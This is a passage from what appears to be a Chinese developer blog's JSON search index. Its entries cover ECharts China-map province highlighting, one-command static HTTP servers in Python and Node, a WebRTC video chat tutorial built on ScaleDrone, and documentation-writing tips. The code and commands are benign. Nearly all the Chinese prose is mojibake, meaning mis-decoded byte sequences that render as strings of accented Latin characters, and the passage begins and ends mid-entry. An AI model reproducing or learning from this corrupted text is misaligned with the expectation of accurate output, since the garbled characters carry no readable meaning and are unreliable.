\u0026#39;æ²³åŒ—\u0026#39; }); 3. å“ªé‡Œå»ä¸‹è½½ä¸­å›½åœ°å›¾ï¼Ÿ å®˜æ–¹ç¤ºä¾‹é‡Œæ˜¯æ²¡æœ‰ä¸­å›½åœ°å›¾çš„ï¼Œä¸è¿‡ä½ å¯ä»¥å»githubçš„å®˜æ–¹ä»“åº“é‡Œæ‰¾ã€‚åœ°å€æ˜¯ï¼šhttps://github.com/apache/incubator-echarts/tree/master/map\n4. åœ°å›¾å­¦ä¹ çš„æ —å­å“ªé‡Œæœ‰ï¼Ÿ 4.1. å…ˆå­¦ä¹ ä¸€ä¸‹ç¾å›½åœ°å›¾æ€ä¹ˆç©å§ echartså®˜æ–¹æ–‡æ¡£ä¸Šæœ‰ç¾å›½åœ°å›¾çš„å®ä¾‹ï¼Œåœ°å€ï¼šhttp://echarts.baidu.com/examples/editor.html?c=map-usa\n4.2. æˆ‘å›½åœ°å›¾ä¹Ÿæ˜¯æœ‰çš„ï¼Œå‚è€ƒiphoneé”€é‡è¿™ä¸ªæ —å­ åœ°å€ï¼šhttp://echarts.baidu.com/option.html#series-map, æ³¨æ„ï¼šåœ°å›¾çš„ç›¸å…³æ–‡æ¡£åœ¨series-\u0026gt;type:mapä¸­\n","permalink":"https://wdd.js.org/posts/2018/02/echarts-highlight-china-map/","summary":"1. å°æ —å­ æœ€æ—©æˆ‘æ˜¯æƒ³é€šè¿‡dispatchActionæ–¹æ³•å»æ”¹å˜é€‰ä¸­çš„çœä»½ï¼Œä½†æ˜¯æ²¡æœ‰èµ·ä½œç”¨ï¼Œå¦‚æœä½ çŸ¥é“è¿™ä¸ªæ–¹æ³•æ€ä¹ˆå®ç°ï¼Œéº»çƒ¦ä½ å¯ä»¥å‘Šè¯‰æˆ‘ã€‚ æˆ‘å®ç°çš„æ–¹æ³•æ˜¯å¦å¤–ä¸€ç§ã€‚\ndispatchAction({ type: \u0026#39;geoSelect\u0026#39;, // å¯é€‰ï¼Œç³»åˆ— indexï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæ•°ç»„æŒ‡å®šå¤šä¸ªç³»åˆ— seriesIndex?: number|Array, // å¯é€‰ï¼Œç³»åˆ—åç§°ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæ•°ç»„æŒ‡å®šå¤šä¸ªç³»åˆ— seriesName?: string|Array, // æ•°æ®çš„ indexï¼Œå¦‚æœä¸æŒ‡å®šä¹Ÿå¯ä»¥é€šè¿‡ name å±æ€§æ ¹æ®åç§°æŒ‡å®šæ•°æ® dataIndex?: number, // å¯é€‰ï¼Œæ•°æ®åç§°ï¼Œåœ¨æœ‰ dataIndex çš„æ—¶å€™å¿½ç•¥ name?: string }) åæ¥æˆ‘æ”¹å˜äº†ä¸€ä¸ªæ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•çš„æ ¸å¿ƒæ€è·¯æ˜¯å®šæ—¶è·å–å›¾æ ‡çš„é…ç½®ï¼Œç„¶åæ›´æ–°é…ç½®ï¼Œæœ€ååœ¨è®¾ç½®é…ç½®ã€‚\nvar myChart = echarts.init(document.getElementById(\u0026#39;china-map\u0026#39;)); var COLORS = [\u0026#34;#070093\u0026#34;, \u0026#34;#1c3fbf\u0026#34;, \u0026#34;#1482e5\u0026#34;, \u0026#34;#70b4eb\u0026#34;, \u0026#34;#b4e0f3\u0026#34;, \u0026#34;#ffffff\u0026#34;]; // æŒ‡å®šå›¾è¡¨çš„é…ç½®é¡¹å’Œæ•°æ® var option = { tooltip: { trigger: \u0026#39;item\u0026#39;, formatter: \u0026#39;{b}\u0026#39; }, series: [ { name: \u0026#39;ä¸­å›½\u0026#39;, type: \u0026#39;map\u0026#39;, mapType: \u0026#39;china\u0026#39;, selectedMode : \u0026#39;single\u0026#39;, label: { normal: { show: true }, emphasis: { show: true } }, data:[ // é»˜è®¤é«˜äº®å®‰å¾½çœ {name:\u0026#39;å®‰å¾½\u0026#39;, selected:true} ], itemStyle: { normal: { areaColor: \u0026#39;rgba(255,255,255,0.","title":"ECharts è½®æµé«˜äº®ä¸­å›½åœ°å›¾å„ä¸ªçœä»½"},{"content":"ç®€æ˜“æœåŠ¡å™¨ï¼šåœ¨å‘½ä»¤æ‰§è¡Œçš„æ‰€åœ¨è·¯å¾„å¯åŠ¨ä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œç„¶åä½ å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®è¯¥è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚\nåœ¨å±€åŸŸç½‘å†…ä¼ æ–‡ä»¶ï¼Œæˆ–è€…è‡ªå·±æµ‹è¯•ä½¿ç”¨éƒ½æ˜¯éå¸¸æ–¹ä¾¿çš„ã€‚\n1. åŸºäºpython 1.1. åŸºäºPython2 python -m SimpleHTTPServer port\n\u0026gt; python -m SimpleHTTPServer 8099 Serving HTTP on 0.0.0.0 port 8099 ... 127.0.0.1 - - [24/Oct/2017 11:07:56] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 1.2. åŸºäºpython3 python3 -m http.server port\n\u0026gt; python3 -m http.server 8099 Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ... 127.0.0.1 - - [24/Oct/2017 11:05:06] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 127.0.0.1 - - [24/Oct/2017 11:05:06] code 404, message File not found 127.0.0.1 - - [24/Oct/2017 11:05:06] \u0026#34;GET /favicon.ico HTTP/1.1\u0026#34; 404 - 2. åŸºäºnodejs é¦–å…ˆä½ è¦å®‰è£…nodejs 2.1. http-server // å®‰è£… npm install http-server -g // ç”¨æ³• http-server [path] [options] 2.2. serve // å®‰è£… npm install -g serve // ç”¨æ³• serve [options] \u0026lt;path\u0026gt; 2.3. webpack-dev-server // å®‰è£… npm install webpack-dev-server -g // ç”¨æ³• webpack-dev-server 2.4. anywhere // å®‰è£… npm install -g anywhere // ç”¨æ³• anywhere anywhere -p port 2.5. puer // å®‰è£… npm -g install puer // ä½¿ç”¨ puer - æä¾›ä¸€ä¸ªå½“å‰æˆ–æŒ‡å®šè·¯å¾„çš„é™æ€æœåŠ¡å™¨ - æ‰€æœ‰æµè§ˆå™¨çš„å®æ—¶åˆ·æ–°ï¼šç¼–è¾‘csså®æ—¶æ›´æ–°(update)é¡µé¢æ ·å¼ï¼Œå…¶å®ƒæ–‡ä»¶åˆ™é‡è½½(reload)é¡µé¢ - æä¾›ç®€å•ç†Ÿæ‚‰çš„mockè¯·æ±‚çš„é…ç½®åŠŸèƒ½ï¼Œå¹¶ä¸”é…ç½®ä¹Ÿæ˜¯è‡ªåŠ¨æ›´æ–°ã€‚ - å¯ç”¨ä½œä»£ç†æœåŠ¡å™¨ï¼Œè°ƒè¯•å¼€å‘æ—¢æœ‰æœåŠ¡å™¨çš„é¡µé¢ï¼Œå¯ä¸mockåŠŸèƒ½é…åˆä½¿ç”¨ - é›†æˆäº†weinreï¼Œå¹¶æä¾›äºŒç»´ç åœ°å€ï¼Œæ–¹ä¾¿ç§»åŠ¨ç«¯çš„è°ƒè¯• - å¯ä»¥ä½œä¸ºconnectä¸­é—´ä»¶ä½¿ç”¨(å‰ææ˜¯åç«¯ä¸ºnodejsï¼Œå¦åˆ™è¯·ä½¿ç”¨ä»£ç†æ¨¡å¼) ","permalink":"https://wdd.js.org/posts/2018/02/one-command-create-static-file-server/","summary":"ç®€æ˜“æœåŠ¡å™¨ï¼šåœ¨å‘½ä»¤æ‰§è¡Œçš„æ‰€åœ¨è·¯å¾„å¯åŠ¨ä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œç„¶åä½ å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®è¯¥è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚\nåœ¨å±€åŸŸç½‘å†…ä¼ æ–‡ä»¶ï¼Œæˆ–è€…è‡ªå·±æµ‹è¯•ä½¿ç”¨éƒ½æ˜¯éå¸¸æ–¹ä¾¿çš„ã€‚\n1. åŸºäºpython 1.1. åŸºäºPython2 python -m SimpleHTTPServer port\n\u0026gt; python -m SimpleHTTPServer 8099 Serving HTTP on 0.0.0.0 port 8099 ... 127.0.0.1 - - [24/Oct/2017 11:07:56] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 1.2. åŸºäºpython3 python3 -m http.server port\n\u0026gt; python3 -m http.server 8099 Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ... 127.0.0.1 - - [24/Oct/2017 11:05:06] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - 127.0.0.1 - - [24/Oct/2017 11:05:06] code 404, message File not found 127.","title":"ä¸€è¡Œå‘½ä»¤æ­å»ºç®€æ˜“é™æ€æ–‡ä»¶httpæœåŠ¡å™¨"},{"content":" æœ¬ä¾‹å­æ˜¯å‚è€ƒwebrtc-tutorial-simple-video-chatåšçš„ã€‚ è¿™ä¸ªæ•™ç¨‹åº”è¯¥ä¸»è¦æ˜¯å»å®£ä¼ ScaleDroneçš„sdk, ä»–ä»¬çš„æœåŠ¡æ˜¯æ”¶è´¹çš„ï¼Œä½†æ˜¯å…è´¹çš„ä¹Ÿå¯ä»¥ç”¨ï¼Œå°±æ˜¯æœ‰äº›æ¬¡æ•°é™åˆ¶ã€‚\næœ¬æ —å­çš„åœ°å€ æœ¬æ —å­çš„pagesåœ°å€\nå› ä¸ºä½¿ç”¨çš„æ˜¯ScaleDroneçš„js sdk, åæœŸå¾ˆå¯èƒ½æœåŠ¡ä¸ç¨³å®šä¹‹ç±»çš„\n1. å‡†å¤‡ ä½¿ç”¨æœ€æ–°ç‰ˆè°·æ­Œæµè§ˆå™¨ï¼ˆ62ç‰ˆï¼‰ è§†é¢‘èŠå¤©ä¸­ ä¸€ä¸ªæ˜¯windows, ä¸€ä¸ªæ˜¯mac stunæœåŠ¡å™¨ä½¿ç”¨è°·æ­Œçš„ï¼Œtrunä½¿ç”¨ScaleDroneçš„sdkï¼Œè¿™æ ·æˆ‘å°±ä¸ç”¨ç®¡æœåŠ¡ç«¯äº†ã€‚ 2. å…ˆä¸Šæ•ˆæœå›¾ 3. å†ä¸Šåœ¨çº¿ä¾‹å­ç‚¹å‡»æ­¤å¤„ 4. æºç åˆ†æ // äº§ç”Ÿéšæœºæ•° if (!location.hash) { location.hash = Math.floor(Math.random() * 0xFFFFFF).toString(16); } // è·å–æˆ¿é—´å· var roomHash = location.hash.substring(1); // æ”¾ç½®ä½ è‡ªå·±çš„é¢‘é“id, è¿™æ˜¯æˆ‘æ³¨å†Œäº†ScaleDrone å®˜ç½‘åï¼Œåˆ›å»ºçš„channel // ä½ ä¹Ÿå¯ä»¥è‡ªå·±åˆ›å»º var drone = new ScaleDrone(\u0026#39;87fYv4ncOoa0Cjne\u0026#39;); // æˆ¿é—´åå¿…é¡»ä»¥ \u0026#39;observable-\u0026#39;å¼€å¤´ var roomName = \u0026#39;observable-\u0026#39; + roomHash; var configuration = { iceServers: [{ urls: \u0026#39;stun:stun.l.google.com:19302\u0026#39; // ä½¿ç”¨è°·æ­Œçš„stunæœåŠ¡ }] }; var room; var pc; function onSuccess() {} function onError(error) { console.error(error); } drone.on(\u0026#39;open\u0026#39;, function(error){ if (error) { return console.error(error);} room = drone.subscribe(roomName); room.on(\u0026#39;open\u0026#39;, function(error){ if (error) {onError(error);} }); // å·²ç»é“¾æ¥åˆ°æˆ¿é—´åï¼Œå°±ä¼šæ”¶åˆ°ä¸€ä¸ª members æ•°ç»„ï¼Œä»£è¡¨æˆ¿é—´é‡Œçš„æˆå‘˜ // è¿™æ—¶å€™ä¿¡ä»¤æœåŠ¡å·²ç»å°±ç»ª room.on(\u0026#39;members\u0026#39;, function(members){ console.log(\u0026#39;MEMBERS\u0026#39;, members); // å¦‚æœä½ æ˜¯ç¬¬äºŒä¸ªé“¾æ¥åˆ°æˆ¿é—´çš„äººï¼Œå°±ä¼šåˆ›å»ºoffer var isOfferer = members.length === 2; startWebRTC(isOfferer); }); }); // é€šè¿‡Scaledroneå‘é€ä¿¡ä»¤æ¶ˆæ¯ function sendMessage(message) { drone.publish({ room: roomName, message }); } function startWebRTC(isOfferer) { pc = new RTCPeerConnection(configuration); // å½“æœ¬åœ°ICE Agentéœ€è¦é€šè¿‡ä¿¡å·æœåŠ¡å™¨å‘é€ä¿¡æ¯åˆ°å…¶ä»–ç«¯æ—¶ // ä¼šè§¦å‘icecandidateäº‹ä»¶å›è°ƒ pc.onicecandidate = function(event){ if (event.candidate) { sendMessage({ \u0026#39;candidate\u0026#39;: event.candidate }); } }; // å¦‚æœç”¨æˆ·æ˜¯ç¬¬äºŒä¸ªè¿›å…¥çš„äººï¼Œå°±åœ¨negotiationneeded äº‹ä»¶ååˆ›å»ºsdp if (isOfferer) { // onnegotiationneeded åœ¨è¦æ±‚sesssionåå•†æ—¶å‘ç”Ÿ pc.onnegotiationneeded = function() { // åˆ›å»ºæœ¬åœ°sdpæè¿° SDP (Session Description Protocol) sessionæè¿°åè®® pc.createOffer().then(localDescCreated).catch(onError); }; } // å½“è¿œç¨‹æ•°æ®æµåˆ°è¾¾æ—¶ï¼Œå°†æ•°æ®æµè£…è½½åˆ°videoä¸­ pc.onaddstream = function(event){ remoteVideo.srcObject = event.stream; }; // è·å–æœ¬åœ°åª’ä½“æµ navigator.mediaDevices.getUserMedia({ audio: true, video: true, }).then( function(stream) { // å°†æœ¬åœ°æ•è·çš„è§†é¢‘æµè£…è½½åˆ°æœ¬åœ°videoä¸­ localVideo.srcObject = stream; // å°†æœ¬åœ°æµåŠ å…¥RTCPeerConnection å®ä¾‹ä¸­ å‘é€åˆ°å…¶ä»–ç«¯ pc.addStream(stream); }, onError); // ä»Scaledroneç›‘å¬ä¿¡ä»¤æ•°æ® room.on(\u0026#39;data\u0026#39;, function(message, client){ // æ¶ˆæ¯æ˜¯æˆ‘è‡ªå·±å‘é€çš„ï¼Œåˆ™ä¸å¤„ç† if (client.id === drone.clientId) { return; } if (message.sdp) { // è®¾ç½®è¿œç¨‹sdp, åœ¨offer æˆ–è€… answerå pc.setRemoteDescription(new RTCSessionDescription(message.sdp), function(){ // å½“æ”¶åˆ°offer åå°±æ¥å¬ if (pc.remoteDescription.type === \u0026#39;offer\u0026#39;) { pc.createAnswer().then(localDescCreated).catch(onError); } }, onError); } else if (message.candidate) { // å¢åŠ æ–°çš„ ICE canidatet åˆ°æœ¬åœ°çš„é“¾æ¥ä¸­ pc.addIceCandidate( new RTCIceCandidate(message.candidate), onSuccess, onError ); } }); } function localDescCreated(desc) { pc.setLocalDescription(desc, function(){ sendMessage({ \u0026#39;sdp\u0026#39;: pc.localDescription }); },onError); } 5. WebRTCç®€ä»‹ 5.1. ä»‹ç» WebRTC æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œç”¨äºWebæµè§ˆå™¨ä¹‹é—´è¿›è¡Œå®æ—¶éŸ³é¢‘è§†é¢‘é€šè®¯ï¼Œæ•°æ®ä¼ é€’ã€‚ WebRTCæœ‰å‡ ä¸ªJavaScript APISã€‚ ç‚¹å‡»é“¾æ¥å»æŸ¥çœ‹demoã€‚\ngetUserMedia(): æ•è·éŸ³é¢‘è§†é¢‘ MediaRecorder: è®°å½•éŸ³é¢‘è§†é¢‘ RTCPeerConnection: åœ¨ç”¨æˆ·ä¹‹é—´ä¼ é€’éŸ³é¢‘æµå’Œè§†é¢‘æµ RTCDataChannel: åœ¨ç”¨æˆ·ä¹‹é—´ä¼ é€’æ–‡ä»¶æµ 5.2. åœ¨å“ªé‡Œä½¿ç”¨WebRTC? Chrome FireFox Opera Android iOS 5.3. ä»€ä¹ˆæ˜¯ä¿¡ä»¤ WebRTCä½¿ç”¨RTCPeerConnectionåœ¨æµè§ˆå™¨ä¹‹é—´ä¼ é€’æµæ•°æ®, ä½†æ˜¯ä¹Ÿéœ€è¦ä¸€ç§æœºåˆ¶å»åè°ƒæ”¶å‘æ§åˆ¶ä¿¡æ¯ï¼Œè¿™å°±æ˜¯ä¿¡ä»¤ã€‚ä¿¡ä»¤çš„æ–¹æ³•å’Œåè®®å¹¶ä¸æ˜¯åœ¨WebRTCä¸­æ˜æ–‡è§„å®šçš„ã€‚ åœ¨codeladä¸­ç”¨çš„æ˜¯Nodeï¼Œä¹Ÿæœ‰è®¸å¤šå…¶ä»–çš„æ–¹æ³•ã€‚\n5.4. ä»€ä¹ˆæ˜¯STUNå’ŒTURNå’ŒICE? STUNï¼ˆSession Traversal Utilities for NATï¼ŒNATä¼šè¯ç©¿è¶Šåº”ç”¨ç¨‹åºï¼‰æ˜¯ä¸€ç§ç½‘ç»œåè®®ï¼Œå®ƒå…è®¸ä½äºNATï¼ˆæˆ–å¤šé‡NATï¼‰åçš„å®¢æˆ·ç«¯æ‰¾å‡ºè‡ªå·±çš„å…¬ç½‘åœ°å€ï¼ŒæŸ¥å‡ºè‡ªå·±ä½äºå“ªç§ç±»å‹çš„NATä¹‹åä»¥åŠNATä¸ºæŸä¸€ä¸ªæœ¬åœ°ç«¯å£æ‰€ç»‘å®šçš„Internetç«¯ç«¯å£ã€‚è¿™äº›ä¿¡æ¯è¢«ç”¨æ¥åœ¨ä¸¤ä¸ªåŒæ—¶å¤„äºNATè·¯ç”±å™¨ä¹‹åçš„ä¸»æœºä¹‹é—´åˆ›å»ºUDPé€šä¿¡ã€‚è¯¥åè®®ç”±RFC 5389å®šä¹‰ã€‚ wikipedia STUN\nTURNï¼ˆå…¨åTraversal Using Relay NAT, NATä¸­ç»§ç©¿é€ï¼‰ï¼Œæ˜¯ä¸€ç§èµ„æ–™ä¼ è¾“åè®®ï¼ˆdata-transfer protocolï¼‰ã€‚å…è®¸åœ¨TCPæˆ–UDPçš„è¿çº¿ä¸Šè·¨è¶ŠNATæˆ–é˜²ç«å¢™ã€‚ TURNæ˜¯ä¸€ä¸ªclient-serveråè®®ã€‚TURNçš„NATç©¿é€æ–¹æ³•ä¸STUNç±»ä¼¼ï¼Œéƒ½æ˜¯é€šè¿‡å–å¾—åº”ç”¨å±‚ä¸­çš„å…¬æœ‰åœ°å€è¾¾åˆ°NATç©¿é€ã€‚ä½†å®ç°TURN clientçš„ç»ˆç«¯å¿…é¡»åœ¨é€šè®¯å¼€å§‹å‰ä¸TURN serverè¿›è¡Œäº¤äº’ï¼Œå¹¶è¦æ±‚TURN serveräº§ç”Ÿ\u0026quot;relay port\u0026quot;ï¼Œä¹Ÿå°±æ˜¯relayed-transport-addressã€‚è¿™æ—¶TURN serverä¼šå»ºç«‹peerï¼Œå³è¿œç«¯ç«¯ç‚¹ï¼ˆremote endpointsï¼‰ï¼Œå¼€å§‹è¿›è¡Œä¸­ç»§ï¼ˆrelayï¼‰çš„åŠ¨ä½œï¼ŒTURN clientåˆ©ç”¨relay portå°†èµ„æ–™ä¼ é€è‡³peerï¼Œå†ç”±peerè½¬ä¼ åˆ°å¦ä¸€æ–¹çš„TURN clientã€‚wikipedia TURN\nICE ï¼ˆInteractive Connectivity Establishmentï¼Œäº’åŠ¨å¼è¿æ¥å»ºç«‹ ï¼‰ï¼Œä¸€ç§ç»¼åˆæ€§çš„NATç©¿è¶Šçš„æŠ€æœ¯ã€‚ äº’åŠ¨å¼è¿æ¥å»ºç«‹æ˜¯ç”±IETFçš„MMUSICå·¥ä½œç»„å¼€å‘å‡ºæ¥çš„ä¸€ç§frameworkï¼Œå¯æ•´åˆå„ç§NATç©¿é€æŠ€æœ¯ï¼Œå¦‚STUNã€TURNï¼ˆTraversal Using Relay NATï¼Œä¸­ç»§NATå®ç°çš„ç©¿é€ï¼‰ã€RSIPï¼ˆRealm Specific IPï¼Œç‰¹å®šåŸŸIPï¼‰ç­‰ã€‚è¯¥frameworkå¯ä»¥è®©SIPçš„å®¢æˆ·ç«¯åˆ©ç”¨å„ç§NATç©¿é€æ–¹å¼æ‰“ç©¿è¿œç¨‹çš„é˜²ç«å¢™ã€‚[wikipedia ICE]\nWebRTCè¢«è®¾è®¡ç”¨äºç‚¹å¯¹ç‚¹ä¹‹é—´å·¥ä½œï¼Œå› æ­¤ç”¨æˆ·å¯ä»¥é€šè¿‡æœ€ç›´æ¥çš„é€”å¾„è¿æ¥ã€‚ç„¶è€Œï¼ŒWebRTCçš„æ„å»ºæ˜¯ä¸ºäº†åº”ä»˜ç°å®ä¸­çš„ç½‘ç»œ: å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºéœ€è¦ç©¿è¶ŠNATç½‘å…³å’Œé˜²ç«å¢™ï¼Œå¹¶ä¸”å¯¹ç­‰ç½‘ç»œéœ€è¦åœ¨ç›´æ¥è¿æ¥å¤±è´¥çš„æƒ…å†µä¸‹è¿›è¡Œå›è°ƒã€‚ ä½œä¸ºè¿™ä¸ªè¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ï¼ŒWebRTC apiä½¿ç”¨STUNæœåŠ¡å™¨æ¥è·å–è®¡ç®—æœºçš„IPåœ°å€ï¼Œå¹¶å°†æœåŠ¡å™¨ä½œä¸ºä¸­ç»§æœåŠ¡å™¨è¿è¡Œï¼Œä»¥é˜²æ­¢å¯¹ç­‰é€šä¿¡å¤±è´¥ã€‚(ç°å®ä¸–ç•Œä¸­çš„WebRTCæ›´è¯¦ç»†åœ°è§£é‡Šäº†è¿™ä¸€ç‚¹ã€‚)\n5.5. WebRTCæ˜¯å¦å®‰å…¨? WebRTCç»„ä»¶æ˜¯å¼ºåˆ¶è¦æ±‚åŠ å¯†çš„ï¼Œå¹¶ä¸”å®ƒçš„JavaScript APISåªèƒ½åœ¨å®‰å…¨çš„åŸŸä¸‹ä½¿ç”¨(HTTPS æˆ–è€… localhost)ã€‚ä¿¡ä»¤æœºåˆ¶å¹¶æ²¡æœ‰è¢«WebRTCæ ‡å‡†å®šä¹‰ï¼Œæ‰€ä»¥æ˜¯å¦ä½¿ç”¨å®‰å…¨çš„åè®®å°±å–å†³äºä½ è‡ªå·±äº†ã€‚\n6. WebRTC å‚è€ƒèµ„æ–™ å®˜ç½‘æ•™ç¨‹\nWebRTC ç®€å•çš„è§†é¢‘èŠå¤© repo\nWebRTC æ•™ç¨‹\nMDN WebRTC API\nè°·æ­Œcodelab WebRTæ•™ç¨‹\ngithubä¸ŠWebRTCå„ç§ä¾‹å­\nsegemntfaultä¸Šå…³äºWebRTCçš„æ•™ç¨‹\n","permalink":"https://wdd.js.org/posts/2018/02/webrtc-tutorial-simple-video-chat/","summary":"æœ¬ä¾‹å­æ˜¯å‚è€ƒwebrtc-tutorial-simple-video-chatåšçš„ã€‚ è¿™ä¸ªæ•™ç¨‹åº”è¯¥ä¸»è¦æ˜¯å»å®£ä¼ ScaleDroneçš„sdk, ä»–ä»¬çš„æœåŠ¡æ˜¯æ”¶è´¹çš„ï¼Œä½†æ˜¯å…è´¹çš„ä¹Ÿå¯ä»¥ç”¨ï¼Œå°±æ˜¯æœ‰äº›æ¬¡æ•°é™åˆ¶ã€‚\næœ¬æ —å­çš„åœ°å€ æœ¬æ —å­çš„pagesåœ°å€\nå› ä¸ºä½¿ç”¨çš„æ˜¯ScaleDroneçš„js sdk, åæœŸå¾ˆå¯èƒ½æœåŠ¡ä¸ç¨³å®šä¹‹ç±»çš„\n1. å‡†å¤‡ ä½¿ç”¨æœ€æ–°ç‰ˆè°·æ­Œæµè§ˆå™¨ï¼ˆ62ç‰ˆï¼‰ è§†é¢‘èŠå¤©ä¸­ ä¸€ä¸ªæ˜¯windows, ä¸€ä¸ªæ˜¯mac stunæœåŠ¡å™¨ä½¿ç”¨è°·æ­Œçš„ï¼Œtrunä½¿ç”¨ScaleDroneçš„sdkï¼Œè¿™æ ·æˆ‘å°±ä¸ç”¨ç®¡æœåŠ¡ç«¯äº†ã€‚ 2. å…ˆä¸Šæ•ˆæœå›¾ 3. å†ä¸Šåœ¨çº¿ä¾‹å­ç‚¹å‡»æ­¤å¤„ 4. æºç åˆ†æ // äº§ç”Ÿéšæœºæ•° if (!location.hash) { location.hash = Math.floor(Math.random() * 0xFFFFFF).toString(16); } // è·å–æˆ¿é—´å· var roomHash = location.hash.substring(1); // æ”¾ç½®ä½ è‡ªå·±çš„é¢‘é“id, è¿™æ˜¯æˆ‘æ³¨å†Œäº†ScaleDrone å®˜ç½‘åï¼Œåˆ›å»ºçš„channel // ä½ ä¹Ÿå¯ä»¥è‡ªå·±åˆ›å»º var drone = new ScaleDrone(\u0026#39;87fYv4ncOoa0Cjne\u0026#39;); // æˆ¿é—´åå¿…é¡»ä»¥ \u0026#39;observable-\u0026#39;å¼€å¤´ var roomName = \u0026#39;observable-\u0026#39; + roomHash; var configuration = { iceServers: [{ urls: \u0026#39;stun:stun.l.google.com:19302\u0026#39; // ä½¿ç”¨è°·æ­Œçš„stunæœåŠ¡ }] }; var room; var pc; function onSuccess() {} function onError(error) { console.","title":"120è¡Œä»£ç å®ç° æµè§ˆå™¨WebRTCè§†é¢‘èŠå¤©"},{"content":" æœ¬æ–‡æ¥è‡ªäºå…¬å¸å†…éƒ¨çš„ä¸€ä¸ªåˆ†äº«ã€‚ åœ¨æ–‡æ¡£æ–¹é¢ï¼Œå¯¹å†…çš„ä¸€äº›æ¥å£æ–‡æ¡£ä¸»è¦æ˜¯ç”¨swaggeræ¥å†™çš„ã€‚è™½ç„¶å¯ä»¥åœ¨çº¿æµ‹è¯•ï¼Œæ¯”è¾ƒæ–¹ä¾¿ã€‚ä½†æ˜¯ä¹Ÿå­˜åœ¨ç€ä¸€äº›æ›´æ–°ä¸åŠæ—¶ï¼Œswggeræ–‡æ¡£æ— æ³•å¯¼å‡ºæˆæ–‡ä»¶çš„é—®é¢˜ã€‚ åœ¨å¯¹å¤–æä¾›çš„æ–‡æ¡£æ–¹é¢ï¼šæˆ‘ä¸»è¦è´Ÿè´£åšä¸€ä¸ªæµè§ˆå™¨ç«¯çš„ä¸€ä¸ªjs sdkã€‚æ–‡æ¡£è¿˜ç®—å¯ä»¥githubåœ°å€ï¼Œæ‰€ä»¥æƒ³æŠŠä¸€äº›å†™æ–‡æ¡£çš„å¿ƒå¾—åˆ†äº«ç»™å¤§å®¶ã€‚\n1. è¡¡é‡å¥½æ–‡æ¡£çš„å”¯ä¸€æ ‡å‡†æ˜¯ä»€ä¹ˆï¼Ÿ Martin(Bobå¤§å”)æ›¾åœ¨ã€Šä»£ç æ•´æ´ä¹‹é“ã€‹ä¸€ä¹¦æ‰“è¶£åœ°è¯´ï¼šå½“ä½ çš„ä»£ç åœ¨åš Code Review æ—¶ï¼Œå®¡æŸ¥è€…è¦æ˜¯æ„¤æ€’åœ°å¼é“ï¼š\nâ€œWhat the fuck is this shit?â€ â€œDude, What the fuckï¼â€ ç­‰è¨€è¾æ¿€çƒˆçš„è¯è¯­æ—¶ï¼Œé‚£è¯´æ˜ä½ å†™çš„ä»£ç æ˜¯ Bad Codeï¼Œå¦‚æœå®¡æŸ¥è€…åªæ˜¯æ¼«ä¸ç»å¿ƒçš„åå‡ºå‡ ä¸ª\nâ€œWhat the fuck?â€ï¼Œ\né‚£è¯´æ˜ä½ å†™çš„æ˜¯ Good Codeã€‚è¡¡é‡ä»£ç è´¨é‡çš„å”¯ä¸€æ ‡å‡†å°±æ˜¯æ¯åˆ†é’Ÿéª‚å‡ºâ€œWTFâ€ çš„é¢‘ç‡ã€‚\nè¡¡é‡æ–‡æ¡£çš„æ ‡å‡†ä¹Ÿæ˜¯å¦‚æ­¤ã€‚\n2. å¥½æ–‡æ¡£çš„ç‰¹ç‚¹ ç®€æ´ï¼šä¸€å¥è¯å¯ä»¥è¯´å®Œçš„äº‹æƒ…ï¼Œå°±ä¸è¦åˆ†ä¸¤å¥è¯æ¥è¯´ã€‚å¹¶ä¸æ˜¯æ–‡æ¡£è¶Šåšè¶Šå¥½ï¼Œå¤ªåšçš„æ–‡æ¡£å¤§å¤šæ²¡äººçœ‹ã€‚ å‡†ç¡®: å­—æ®µç±»å‹ï¼Œé»˜è®¤å€¼ï¼Œå¤‡æ³¨ï¼Œæ˜¯å¦å¿…å¡«ç­‰å±æ€§è¯´æ˜ã€‚ é€»è¾‘æ€§: æ–‡æ¡£å¦‚ä½•åˆ’åˆ†ï¼Ÿ åˆ©äºæŸ¥çœ‹ã€‚ demoèƒœåƒè¨€: å¥½çš„demoèƒœè¿‡å„ç§å­—æ®µè¯´æ˜ï¼Œå¯ä»¥å¤åˆ¶ä¸‹æ¥ç›´æ¥ä½¿ç”¨ã€‚ è¯»è€…å¿ƒ: ä»è¯»è€…çš„è§’åº¦è€ƒè™‘, æ–¹æ³•å°½é‡ç®€æ´ã€‚å¯ä»¥ä¼ é€’ä¸€ä¸ªå‚æ•°æå®šçš„äº‹æƒ…ï¼Œç»å¯¹ä¸è¦è®©ç”¨æˆ·å»ä¼ ä¸¤ä¸ªå‚æ•°ã€‚ åŠæ—¶æ›´æ–°: ä¸æ›´æ–°çš„æ–‡æ¡£æ¯”bugæ›´ä¸¥é‡ã€‚ å‘åå…¼å®¹: ä¸è¦éšæ„åºŸå¼ƒå·²æœ‰çš„æ¥å£æˆ–è€…æŸä¸ªå­—æ®µï¼Œé™¤éä½ è€ƒè™‘åˆ°è¿™æ ·åšçš„åæœã€‚ å»ºç«‹æ–‡æ¡£è¯æ±‡è¡¨ï¼šæ¯ä¸ªæ¦‚å¿µåªæœ‰ä¸€ä¸ªåå­—ï¼Œä¸è¦éšæ„èµ·åå­—ï¼Œåä¸æ­£åˆ™è¨€ä¸é¡ºã€‚ æ ¼å¼ç»Ÿä¸€ï¼šä¾‹å¦‚æ—¶é—´æ ¼å¼ã€‚æˆ‘æ›¾è§è¿‡2017-09-12 09:32:23, æˆ–2017.09.12 09:32:23æˆ–2017.09.12 